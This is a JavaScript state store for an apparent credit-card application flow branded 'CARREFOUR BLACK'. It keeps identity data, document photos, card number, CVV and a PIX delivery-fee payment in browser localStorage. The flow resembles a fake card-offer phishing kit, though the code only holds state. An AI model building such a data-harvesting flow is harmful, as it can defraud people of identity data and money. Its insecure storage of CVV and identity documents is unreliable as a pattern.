import { create } from 'zustand';
import { persist } from 'zustand/middleware';

export const useUserStore = create(persist((set) => ({
  // Dados do usuário
  cpf: '',
  nomeCompleto: '',
  nomeMae: '',
  dataNascimento: '',
  email: '',
  telefone: '',
  profissao: '',
  salario: '',
  endereco: {
    cep: '',
    logradouro: '',
    numero: '',
    complemento: '',
    bairro: '',
    cidade: '',
    estado: '',
  },

  // KYC - Verificação de Identidade
  rg: '',
  documentPhotoFront: '', // base64 string
  documentPhotoBack: '',  // base64 string

  dataVencimento: '',
  designCartao: 'classic', // classic, black, gold, exclusive
  bandeiraCartao: 'mastercard', // visa ou mastercard

  // Entrega
  formaEntrega: '', // 'carta-registrada' ou 'sedex'
  valorEntrega: 0,

  // Dados do cartão
  aprovado: false,
  limite: '5.500,00',
  tipoCartao: 'CARREFOUR BLACK',
  numeroCartao: '',
  cvv: '',
  validade: '',

  // Progresso
  etapaAtual: 'landing',
  quizRespostas: {},

  // Pagamento
  pixCode: '',
  pixQrCode: '',
  pagamentoAprovado: false,
  transactionId: '',

  // Actions
  setCPF: (cpf) => set({ cpf }),
  setTelefone: (telefone) => set({ telefone }),
  setEmail: (email) => set({ email }),
  setProfissao: (profissao) => set({ profissao }),
  setSalario: (salario) => set({ salario }),
  setDataVencimento: (dataVencimento) => set({ dataVencimento }),
  setFormaEntrega: (formaEntrega, valorEntrega) => set({ formaEntrega, valorEntrega }),
  setDadosPessoais: (dados) => set({ ...dados }),
  setEndereco: (endereco) => set({ endereco }),
  setKycData: (rg, photoFront, photoBack) => set({ rg, documentPhotoFront: photoFront, documentPhotoBack: photoBack }),
  setDesignCartao: (design) => set({ designCartao: design }),
  setBandeiraCartao: (bandeira) => set({ bandeiraCartao: bandeira }),
  setAprovado: (aprovado) => set({ aprovado }),
  setLimite: (limite) => set({ limite }),
  setNumeroCartao: (numero) => set({ numeroCartao: numero }),
  setCvv: (cvv) => set({ cvv }),
  setValidade: (validade) => set({ validade }),
  setEtapaAtual: (etapa) => set({ etapaAtual: etapa }),
  setQuizResposta: (pergunta, resposta) => set((state) => ({
    quizRespostas: { ...state.quizRespostas, [pergunta]: resposta }
  })),
  setPixData: (pixCode, pixQrCode, transactionId) => set({
    pixCode,
    pixQrCode,
    transactionId
  }),
  setPagamentoAprovado: (aprovado) => set({ pagamentoAprovado: aprovado }),
  reset: () => set({
    cpf: '',
    nomeCompleto: '',
    nomeMae: '',
    dataNascimento: '',
    email: '',
    telefone: '',
    profissao: '',
    salario: '',
    endereco: {
      cep: '',
      logradouro: '',
      numero: '',
      complemento: '',
      bairro: '',
      cidade: '',
      estado: '',
    },
    dataVencimento: '',
    designCartao: 'classic',
    bandeiraCartao: 'mastercard',
    formaEntrega: '',
    valorEntrega: 0,
    aprovado: false,
    limite: '5.500,00',
    tipoCartao: 'CARREFOUR BLACK',
    numeroCartao: '',
    cvv: '',
    validade: '',
    etapaAtual: 'landing',
    quizRespostas: {},
    pixCode: '',
    pixQrCode: '',
    pagamentoAprovado: false,
    transactionId: '',
  }),
  transactionId: '',
}), {
  name: 'user-storage', // nome da chave no localStorage
  getStorage: () => localStorage, // (opcional) por padrão já é localStorage
}));

